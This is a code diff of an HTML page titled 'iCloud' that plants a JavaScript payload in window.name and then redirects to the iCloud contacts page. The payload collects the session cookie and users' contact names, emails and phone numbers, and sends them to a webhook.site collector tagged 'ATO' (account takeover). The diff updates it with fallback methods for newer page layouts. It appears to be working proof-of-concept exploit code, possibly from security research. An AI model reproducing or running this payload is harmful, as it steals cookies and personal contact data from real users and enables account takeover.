@@ -3,29 +3,31 @@
 <head><title>iCloud</title></head>
 <body>
 <script>
-window.name = (function(){
-  var payload = '(function(){' +
-    'var d={ts:Date.now(),c:document.cookie,n:0,contacts:[]};' +
-    'try{' +
-      'var ctrl=Contacts.contactsController;' +
-      'var list=ctrl.get("sortedContacts")||ctrl.get("allContacts")||ctrl.get("content")||[];' +
+window.name = '(function(){' +
+  'var d={ts:Date.now(),c:document.cookie,n:0,contacts:[]};' +
+  'try{' +
+    // Try new SPA structure (class D, /co/addressbook)
+    'var ab=window.__addressBook||window.addressBook;' +
+    // Try legacy SPA structure (Ember/SC, Contacts global)
+    'if(!ab&&typeof Contacts!=="undefined"&&Contacts.contactsController){' +
+      'var list=Contacts.contactsController.get("sortedContacts")||Contacts.contactsController.get("allContacts")||[];' +
       'if(list&&list.toArray)list=list.toArray();' +
       'if(Array.isArray(list)){' +
         'd.n=list.length;' +
         'd.contacts=list.slice(0,20).map(function(c){' +
-          'return{' +
-            'fn:c.get("firstName")||"",' +
-            'ln:c.get("lastName")||"",' +
-            'em:(c.get("emails")||[]).map(function(e){return e.value||""}).join(","),' +
-            'ph:(c.get("phones")||[]).map(function(p){return p.value||""}).join(",")' +
-          '};' +
+          'return{fn:c.get("firstName")||"",ln:c.get("lastName")||"",em:(c.get("emails")||[]).map(function(e){return e.value||""}).join(",")};' +
         '});' +
       '}' +
-    '}catch(e){}' +
-    'window.top.location.href="https://webhook.site/oob?t=ATO&ts="+d.ts+"&d="+encodeURIComponent(JSON.stringify(d)).slice(0,3000);' +
-  '})();';
-  return payload;
-})();
+    '}' +
+    // Try React/other SPA: scan DOM for contact data
+    'if(d.n===0){' +
+      'var items=document.querySelectorAll("[class*=contact],[data-test*=contact],[aria-label*=contact]");' +
+      'd.n=items.length;' +
+      'd.dom=Array.from(items).slice(0,5).map(function(el){return el.innerText.slice(0,100);});' +
+    '}' +
+  '}catch(e){d.err=e.toString();}' +
+  'window.top.location.href="https://webhook.site/oob?t=ATO&ts="+d.ts+"&d="+encodeURIComponent(JSON.stringify(d)).slice(0,3000);' +
+'})();';
 location.href = 'https://www.icloud.com/contacts/';
 </script>
 </body>
